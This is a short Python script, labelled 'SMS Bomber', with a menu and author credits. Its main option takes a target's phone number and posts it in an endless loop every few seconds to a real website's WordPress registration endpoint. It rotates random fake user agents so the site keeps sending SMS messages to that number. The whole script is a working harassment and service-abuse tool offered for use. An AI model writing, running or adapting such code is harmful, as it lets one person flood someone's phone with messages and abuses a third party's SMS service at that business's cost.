import requests, fake_useragent, time, random
from termcolor import colored
import os

os.system('cls' if os.name == 'nt' else 'clear')
usr = fake_useragent.UserAgent().random
header = {'user_agent': usr}

print(colored('''
┌─┐ ┌┬┐┌─┬┐┌─┬─┐┌─┐
││└┐││││┌┤││┌┤│└┘││
│┌┐└┘│└┘┘│└┘┘│┌┐┌┐│
││└┐││┌┐││┌┐│││││││
││ │││││└┤││└┤│││││
└┘ └─┴┘└─┴┘└─┴┘└┘└┘
           ''', 'red'), 'UKRAINE')
print('''
1. SMS Bomber
2. Help
3. About

0. Exit''')
choose = input('Choose: ')

while True:
    if choose == "1":
        os.system('cls' if os.name == 'nt' else 'clear')
        number = input("Enter the number(Without +): ")

        while True:
            usr = fake_useragent.UserAgent().random
            header = {'user_agent': usr}

            try:
                requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', headers = header, data = {'phone': number, 'action': 'ajax_register_user', 'step': '1', 'security_login': 'e14969c2cf'})
                print(colored("[+]", 'green'), "TarantinoFamily sent")
            except:
                print(colored('[-]', "red"), 'TarantinoFamily not sent')

            time.sleep(3)

    elif choose == '2':
        os.system('cls' if os.name == 'nt' else 'clear')
        print('''Help:
        This is help
        ''')
    elif choose == '3':
        os.system('cls' if os.name == 'nt' else 'clear')
        print('''About:
    Created by katsume.
    TG: @nlxrd
    Github: github.com/0katsume
        ''')
    elif choose == "0":
        exit()
    else:
        exit()
    print('''1. SMS Bomber
2. Help
3. About

0. Exit''')
    choose = input('Choose: ')
